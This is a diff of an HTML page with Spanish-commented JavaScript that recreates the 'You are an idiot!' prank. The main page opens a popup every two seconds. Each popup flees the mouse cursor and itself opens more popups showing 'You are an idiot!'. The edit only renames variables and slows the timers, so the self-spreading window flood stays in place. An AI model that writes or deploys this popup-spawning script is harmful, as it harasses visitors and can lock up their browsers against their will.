@@ -30,14 +30,9 @@
   <div>You are an idiot!</div>
   
   <script>
-    function abrirNuevaVentana() {
+    function abrirVentana() {
       const videoSource = 'tu_video.mp4';
-      const windowWidth = window.innerWidth;
-      const windowHeight = window.innerHeight;
-      const randomX = Math.floor(Math.random() * (windowWidth - 400));
-      const randomY = Math.floor(Math.random() * (windowHeight - 300));
-
-      const nuevaVentana = window.open('', '_blank', `width=400,height=300,left=${randomX},top=${randomY}`);
+      const nuevaVentana = window.open('', '_blank', 'width=400,height=300');
 
       if (nuevaVentana) {
         nuevaVentana.document.write(`
@@ -57,26 +52,25 @@
               <script>
                 // Función para hacer que la ventana "huya" del ratón
                 document.addEventListener('mousemove', (event) => {
-                  const windowX = window.screenX;
-                  const windowY = window.screenY;
-                  const distance = 150; // Distancia para que la ventana "huya"
+                  const distancia = 100;
+                  const ventanaX = window.screenX + window.outerWidth / 2;
+                  const ventanaY = window.screenY + window.outerHeight / 2;
 
-                  if (Math.abs(event.screenX - windowX) < distance && Math.abs(event.screenY - windowY) < distance) {
-                    // Mover la ventana a una posición aleatoria en la pantalla
-                    const newX = Math.floor(Math.random() * (window.screen.availWidth - window.outerWidth));
-                    const newY = Math.floor(Math.random() * (window.screen.availHeight - window.outerHeight));
-                    window.moveTo(newX, newY);
+                  if (Math.abs(event.screenX - ventanaX) < distancia && Math.abs(event.screenY - ventanaY) < distancia) {
+                    const nuevaX = Math.floor(Math.random() * (window.screen.availWidth - window.outerWidth));
+                    const nuevaY = Math.floor(Math.random() * (window.screen.availHeight - window.outerHeight));
+                    window.moveTo(nuevaX, nuevaY);
                   }
                 });
 
-                // Intentar abrir más ventanas desde dentro de la ventana
+                // Configuración para abrir más ventanas
                 setInterval(() => {
                   const win = window.open('', '_blank', 'width=400,height=300');
                   if (win) {
                     win.document.write('<p style="color: yellow; font-size: 20px; background: black; text-align: center;">You are an idiot!</p>');
                     win.blur();
                   }
-                }, 1000);
+                }, 2000);
               <\/script>
             </body>
           </html>
@@ -85,8 +79,8 @@
       }
     }
 
-    // Comienza el ciclo de ventanas en la página principal
-    setInterval(abrirNuevaVentana, 1000);
+    // Llamada inicial para abrir una ventana y desencadenar el proceso
+    setInterval(abrirVentana, 2000);
   </script>
 </body>
 </html>
